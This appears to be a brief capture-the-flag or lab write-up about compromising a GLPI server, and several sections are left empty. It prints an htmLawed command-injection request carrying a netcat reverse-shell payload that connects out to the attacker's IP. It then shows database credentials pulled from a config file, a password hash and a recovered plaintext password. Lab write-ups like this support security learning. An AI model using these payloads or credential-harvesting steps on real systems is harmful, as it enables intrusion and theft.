#Pwned! 
```
192.168.208.242
```
## Nmap
```

```

## Nmap UDP


# Enumeration

## HTTP

https://github.com/noxlumens/CVE-2022-35914_poc/blob/main/CVE-2022-35914.py
https://github.com/Digitemis/GLPIScan
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241007111121.png?raw=true)
```
POST //vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1

...
&hhook=array_map&text=call_user_func&hexec=passthru&spec[0]=&spec[1]=id&sid=947ekfk0o3aa2umtra329pr5um
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241007111001.png?raw=true)
```
&hhook=array_map&text=call_user_func&hexec=passthru&spec[0]=&spec[1]=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+192.168.45.200+80+>/tmp/f&sid=947ekfk0o3aa2umtra329pr5um
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241007112056.png?raw=true)


# PrivEsc

## Manual
```
/var/www/glpi/config/config_db.php:   public $dbpassword = 'glpi_db_password';                                       
/var/www/glpi/config/config_db.php:   public $dbuser = 'glpi'; 
```

```
mysql -u glpi --password='glpi_db_password'
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241007113912.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241007114110.png?raw=true)

```
$2y$10$jG8/feTYsguxsnBqRG6.judCDSNHY4it8SgBTAHig9pMkfmMl9CFa
```

```
select * from glpi_itilfollowups;
```

SnowboardSkateboardRoller234

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241007120302.png?raw=true)

```
wget http://localhost:8080/ -S
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241007121934.png?raw=true)


## Automated

### Peass
etc/alternatives/my.cnf
-rw-r--r-- 1 root root 601 Jan 24  2023 /etc/ssh/ssh_host_dsa_key.pub                                                                                                                                                                      
-rw-r--r-- 1 root root 173 Jan 24  2023 /etc/ssh/ssh_host_ecdsa_key.pub                                                                                                                                                                    
-rw-r--r-- 1 root root 93 Jan 24  2023 /etc/ssh/ssh_host_ed25519_key.pub                                                                                                                                                                   
-rw-r--r-- 1 root root 565 Jan 24  2023 /etc/ssh/ssh_host_rsa_key.pu

/var/www/glpi/vendor/tecnickcom/tcpdf/examples/data/cert/tcpdf.crt
### Mimikatz


